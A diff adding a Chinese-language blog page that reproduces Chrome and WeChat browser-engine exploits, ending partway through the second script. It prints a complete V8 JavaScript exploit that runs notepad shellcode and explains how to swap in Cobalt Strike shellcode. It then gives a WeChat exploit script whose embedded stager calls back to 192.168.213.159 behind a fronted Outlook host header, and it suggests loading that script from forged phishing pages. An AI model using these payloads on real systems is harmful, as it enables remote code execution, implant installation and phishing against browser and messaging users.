@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-Hans">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="敢问路在何方" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Chrome+微信漏洞复现 |  回梦&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Chrome-微信漏洞复现"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Chrome+微信漏洞复现
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2021-04-18T05:29:00.000Z" itemprop="datePublished">2021-04-18</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">14 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="Chrome漏洞复现"><a href="#Chrome漏洞复现" class="headerlink" title="Chrome漏洞复现"></a>Chrome漏洞复现</h1><h2 id="弹记事本"><a href="#弹记事本" class="headerlink" title="弹记事本"></a>弹记事本</h2><p>POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    function gc() &#123;</span><br><span class="line">        for (var i &#x3D; 0; i &lt; 0x80000; ++i) &#123;</span><br><span class="line">            var a &#x3D; new ArrayBuffer();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    let shellcode &#x3D; [0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,</span><br><span class="line">        0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,</span><br><span class="line">        0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,</span><br><span class="line">        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,</span><br><span class="line">        0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,</span><br><span class="line">        0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,</span><br><span class="line">        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,</span><br><span class="line">        0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,</span><br><span class="line">        0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,</span><br><span class="line">        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,</span><br><span class="line">        0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,</span><br><span class="line">        0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,</span><br><span class="line">        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,</span><br><span class="line">        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,</span><br><span class="line">        0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,</span><br><span class="line">        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,</span><br><span class="line">        0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x6E, 0x6F, 0x74, 0x65, 0x70,</span><br><span class="line">        0x61, 0x64, 0x2E, 0x65, 0x78, 0x65, 0x00];</span><br><span class="line">    var wasmCode &#x3D; new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);</span><br><span class="line">    var wasmModule &#x3D; new WebAssembly.Module(wasmCode);</span><br><span class="line">    var wasmInstance &#x3D; new WebAssembly.Instance(wasmModule);</span><br><span class="line">    var main &#x3D; wasmInstance.exports.main;</span><br><span class="line">    var bf &#x3D; new ArrayBuffer(8);</span><br><span class="line">    var bfView &#x3D; new DataView(bf);</span><br><span class="line">    function fLow(f) &#123;</span><br><span class="line">        bfView.setFloat64(0, f, true);</span><br><span class="line">        return (bfView.getUint32(0, true));</span><br><span class="line">    &#125;</span><br><span class="line">    function fHi(f) &#123;</span><br><span class="line">        bfView.setFloat64(0, f, true);</span><br><span class="line">        return (bfView.getUint32(4, true))</span><br><span class="line">    &#125;</span><br><span class="line">    function i2f(low, hi) &#123;</span><br><span class="line">        bfView.setUint32(0, low, true);</span><br><span class="line">        bfView.setUint32(4, hi, true);</span><br><span class="line">        return bfView.getFloat64(0, true);</span><br><span class="line">    &#125;</span><br><span class="line">    function f2big(f) &#123;</span><br><span class="line">        bfView.setFloat64(0, f, true);</span><br><span class="line">        return bfView.getBigUint64(0, true);</span><br><span class="line">    &#125;</span><br><span class="line">    function big2f(b) &#123;</span><br><span class="line">        bfView.setBigUint64(0, b, true);</span><br><span class="line">        return bfView.getFloat64(0, true);</span><br><span class="line">    &#125;</span><br><span class="line">    class LeakArrayBuffer extends ArrayBuffer &#123;</span><br><span class="line">        constructor(size) &#123;</span><br><span class="line">            super(size);</span><br><span class="line">            this.slot &#x3D; 0xb33f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function foo(a) &#123;</span><br><span class="line">        let x &#x3D; -1;</span><br><span class="line">        if (a) x &#x3D; 0xFFFFFFFF;</span><br><span class="line">        var arr &#x3D; new Array(Math.sign(0 - Math.max(0, x, -1)));</span><br><span class="line">        arr.shift();</span><br><span class="line">        let local_arr &#x3D; Array(2);</span><br><span class="line">        local_arr[0] &#x3D; 5.1;&#x2F;&#x2F;4014666666666666</span><br><span class="line">        let buff &#x3D; new LeakArrayBuffer(0x1000);&#x2F;&#x2F;byteLength idx&#x3D;8</span><br><span class="line">        arr[0] &#x3D; 0x1122;</span><br><span class="line">        return [arr, local_arr, buff];</span><br><span class="line">    &#125;</span><br><span class="line">    for (var i &#x3D; 0; i &lt; 0x10000; ++i)</span><br><span class="line">        foo(false);</span><br><span class="line">    gc(); gc();</span><br><span class="line">    [corrput_arr, rwarr, corrupt_buff] &#x3D; foo(true);</span><br><span class="line">    corrput_arr[12] &#x3D; 0x22444;</span><br><span class="line">    delete corrput_arr;</span><br><span class="line">    function setbackingStore(hi, low) &#123;</span><br><span class="line">        rwarr[4] &#x3D; i2f(fLow(rwarr[4]), hi);</span><br><span class="line">        rwarr[5] &#x3D; i2f(low, fHi(rwarr[5]));</span><br><span class="line">    &#125;</span><br><span class="line">    function leakObjLow(o) &#123;</span><br><span class="line">        corrupt_buff.slot &#x3D; o;</span><br><span class="line">        return (fLow(rwarr[9]) - 1);</span><br><span class="line">    &#125;</span><br><span class="line">    let corrupt_view &#x3D; new DataView(corrupt_buff);</span><br><span class="line">    let corrupt_buffer_ptr_low &#x3D; leakObjLow(corrupt_buff);</span><br><span class="line">    let idx0Addr &#x3D; corrupt_buffer_ptr_low - 0x10;</span><br><span class="line">    let baseAddr &#x3D; (corrupt_buffer_ptr_low &amp; 0xffff0000) - ((corrupt_buffer_ptr_low &amp; 0xffff0000) % 0x40000) + 0x40000;</span><br><span class="line">    let delta &#x3D; baseAddr + 0x1c - idx0Addr;</span><br><span class="line">    if ((delta % 8) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        let baseIdx &#x3D; delta &#x2F; 8;</span><br><span class="line">        this.base &#x3D; fLow(rwarr[baseIdx]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let baseIdx &#x3D; ((delta - (delta % 8)) &#x2F; 8);</span><br><span class="line">        this.base &#x3D; fHi(rwarr[baseIdx]);</span><br><span class="line">    &#125;</span><br><span class="line">    let wasmInsAddr &#x3D; leakObjLow(wasmInstance);</span><br><span class="line">    setbackingStore(wasmInsAddr, this.base);</span><br><span class="line">    let code_entry &#x3D; corrupt_view.getFloat64(13 * 8, true);</span><br><span class="line">    setbackingStore(fLow(code_entry), fHi(code_entry));</span><br><span class="line">    for (let i &#x3D; 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        corrupt_view.setUint8(i, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    main();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>Chrome需要关闭沙箱才能够进行实现</p>
+<p>增加 <code>-no-sandbox</code> 参数 关闭沙箱</p>
+<p><img src="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png"></p>
+<p>将上述POC保存为html，然后进行打开</p>
+<p><img src="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png"></p>
+<h2 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h2><p>首先生成C语言的shellcode</p>
+<p><img src="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png"></p>
+<p>将shellcode的\替换成,0再替换弹记事本的POC即可</p>
+<p><img src="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png"></p>
+<p><img src="/2021/04/18/Chrome-%E5%BE%AE%E4%BF%A1%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png"></p>
+<h1 id="微信漏洞复现"><a href="#微信漏洞复现" class="headerlink" title="微信漏洞复现"></a>微信漏洞复现</h1><p>为了达到更好的效果，可以使用其他页面进行伪造钓鱼，只要在html中加载下面这个JS文件即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">ENABLE_LOG &#x3D; true;</span><br><span class="line">IN_WORKER &#x3D; true;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; run calc and hang in a loop</span><br><span class="line">var shellcode &#x3D; [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x75,0x72,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4f,0xff,0xff,0xff,0x5d,0x6a,0x00,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x00,0x41,0x56,0x49,0x89,0xe6,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x48,0x31,0xc9,0x48,0x31,0xd2,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x41,0x50,0x41,0x50,0x41,0xba,0x3a,0x56,0x79,0xa7,0xff,0xd5,0xe9,0x93,0x00,0x00,0x00,0x5a,0x48,0x89,0xc1,0x41,0xb8,0xbb,0x01,0x00,0x00,0x4d,0x31,0xc9,0x41,0x51,0x41,0x51,0x6a,0x03,0x41,0x51,0x41,0xba,0x57,0x89,0x9f,0xc6,0xff,0xd5,0xeb,0x79,0x5b,0x48,0x89,0xc1,0x48,0x31,0xd2,0x49,0x89,0xd8,0x4d,0x31,0xc9,0x52,0x68,0x00,0x32,0xc0,0x84,0x52,0x52,0x41,0xba,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x48,0x83,0xc3,0x50,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0xba,0x1f,0x00,0x00,0x00,0x6a,0x00,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x41,0xb9,0x04,0x00,0x00,0x00,0x41,0xba,0x75,0x46,0x9e,0x86,0xff,0xd5,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0xff,0xff,0xff,0xff,0x4d,0x31,0xc9,0x52,0x52,0x41,0xba,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x0f,0x85,0x9d,0x01,0x00,0x00,0x48,0xff,0xcf,0x0f,0x84,0x8c,0x01,0x00,0x00,0xeb,0xb3,0xe9,0xe4,0x01,0x00,0x00,0xe8,0x82,0xff,0xff,0xff,0x2f,0x52,0x70,0x63,0x00,0x18,0x4c,0xd5,0xda,0x7a,0x61,0x11,0x53,0x3f,0x8e,0x14,0x97,0x2b,0xd6,0x22,0x99,0xaf,0x68,0x7f,0x42,0x09,0xf1,0xe7,0xfc,0x15,0xea,0x18,0xa0,0x5f,0x20,0x09,0x4b,0x96,0xe8,0x30,0xcf,0xc2,0xca,0x03,0x5b,0xe4,0x43,0x63,0x05,0xc8,0x6f,0x9a,0x53,0x18,0xba,0x09,0xba,0xf1,0x10,0x73,0x6a,0x9a,0x82,0xec,0x43,0xef,0xca,0x97,0x96,0xeb,0x6c,0x19,0x5c,0xad,0xb5,0x5c,0x07,0x31,0xf2,0x00,0x48,0x6f,0x73,0x74,0x3a,0x20,0x6f,0x75,0x74,0x6c,0x6f,0x6f,0x6b,0x2e,0x6c,0x69,0x76,0x65,0x2e,0x63,0x6f,0x6d,0x0d,0x0a,0x41,0x63,0x63,0x65,0x70,0x74,0x3a,0x20,0x2a,0x2f,0x2a,0x0d,0x0a,0x55,0x73,0x65,0x72,0x2d,0x41,0x67,0x65,0x6e,0x74,0x3a,0x20,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x4e,0x54,0x20,0x36,0x2e,0x31,0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,0x65,0x62,0x4b,0x69,0x74,0x2f,0x35,0x33,0x37,0x2e,0x33,0x36,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x0d,0x0a,0x00,0x04,0x23,0x53,0xc1,0x2f,0x88,0xa3,0xf9,0x12,0xf8,0x36,0x1c,0x73,0xa0,0x5f,0x5f,0xe9,0x64,0x41,0x0e,0x77,0xbe,0xd3,0x60,0x22,0x1d,0xb4,0x53,0xf7,0x0a,0xfc,0x8f,0xb2,0x88,0x05,0x1e,0xef,0xe5,0x5d,0x0e,0x71,0x1d,0x77,0x63,0x86,0xef,0xf5,0xe3,0x24,0x73,0x14,0x17,0x06,0xaf,0x46,0x11,0x5a,0x45,0xc3,0xbc,0x7b,0xb0,0xd0,0xe4,0x95,0xa5,0xa3,0x2f,0x4a,0x82,0x77,0xfa,0x67,0x85,0x7b,0x96,0xcf,0x5a,0x50,0x61,0x11,0x5a,0xed,0xc9,0x60,0x1f,0x0c,0x12,0x3b,0x2a,0x6d,0x92,0x32,0xf8,0xcb,0xf1,0xfa,0xae,0xbd,0x50,0xb4,0xaa,0xc8,0xa8,0xa6,0x46,0x29,0x99,0xd5,0x17,0xfc,0x77,0x7e,0x99,0xfe,0x01,0x79,0x85,0x91,0xdf,0x1f,0x71,0xae,0x90,0xa5,0x93,0x1d,0x0f,0x15,0x9b,0x59,0x16,0x0b,0x06,0xd9,0x99,0x1a,0x83,0x0c,0x99,0x6e,0x45,0x66,0xa0,0xae,0x98,0xcb,0x58,0x07,0xb3,0x1e,0x04,0xc2,0x9f,0xf5,0xbd,0x79,0xc4,0xa0,0xac,0x08,0x16,0x16,0x38,0xf6,0xd5,0xae,0xd9,0x4c,0x0a,0xa3,0xe7,0x65,0x19,0x76,0xe1,0x82,0x83,0x27,0xba,0x0d,0xbe,0x18,0x75,0x00,0x41,0xbe,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x48,0x31,0xc9,0xba,0x00,0x00,0x40,0x00,0x41,0xb8,0x00,0x10,0x00,0x00,0x41,0xb9,0x40,0x00,0x00,0x00,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x41,0xb8,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x41,0xba,0x12,0x96,0x89,0xe2,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb6,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd7,0x58,0x58,0x58,0x48,0x05,0x00,0x00,0x00,0x00,0x50,0xc3,0xe8,0x7f,0xfd,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x32,0x31,0x33,0x2e,0x31,0x35,0x39,0x00,0x51,0x09,0xbf,0x6d];</span><br><span class="line"></span><br><span class="line">function print(data) &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var not_optimised_out &#x3D; 0;</span><br><span class="line">var target_function &#x3D; (function (value) &#123;</span><br><span class="line">    if (value &#x3D;&#x3D; 0xdecaf0) &#123;</span><br><span class="line">        not_optimised_out +&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out +&#x3D; 1;</span><br><span class="line">    not_optimised_out |&#x3D; 0xff;</span><br><span class="line">    not_optimised_out *&#x3D; 12;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123;</span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var g_array;</span><br><span class="line">var tDerivedNCount &#x3D; 17 * 87481 - 8;</span><br><span class="line">var tDerivedNDepth &#x3D; 19 * 19;</span><br><span class="line"></span><br><span class="line">function cb(flag) &#123;</span><br><span class="line">    if (flag &#x3D;&#x3D; true) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    g_array &#x3D; new Array(0);</span><br><span class="line">    g_array[0] &#x3D; 0x1dbabe * 2;</span><br><span class="line">    return &#39;c01db33f&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function gc() &#123;</span><br><span class="line">    for (var i &#x3D; 0; i &lt; 0x10000; ++i) &#123;</span><br><span class="line">        new String();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function oobAccess() &#123;</span><br><span class="line">    var this_ &#x3D; this;</span><br><span class="line">    this.buffer &#x3D; null;</span><br><span class="line">    this.buffer_view &#x3D; null;</span><br><span class="line"></span><br><span class="line">    this.page_buffer &#x3D; null;</span><br><span class="line">    this.page_view &#x3D; null;</span><br><span class="line"></span><br><span class="line">    this.prevent_opt &#x3D; [];</span><br><span class="line"></span><br><span class="line">    var kSlotOffset &#x3D; 0x1f;</span><br><span class="line">    var kBackingStoreOffset &#x3D; 0xf;</span><br><span class="line"></span><br><span class="line">    class LeakArrayBuffer extends ArrayBuffer &#123;</span><br><span class="line">        constructor() &#123;</span><br><span class="line">            super(0x1000);</span><br><span class="line">            this.slot &#x3D; this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    this.page_buffer &#x3D; new LeakArrayBuffer();</span><br><span class="line">    this.page_view &#x3D; new DataView(this.page_buffer);</span><br><span class="line"></span><br><span class="line">    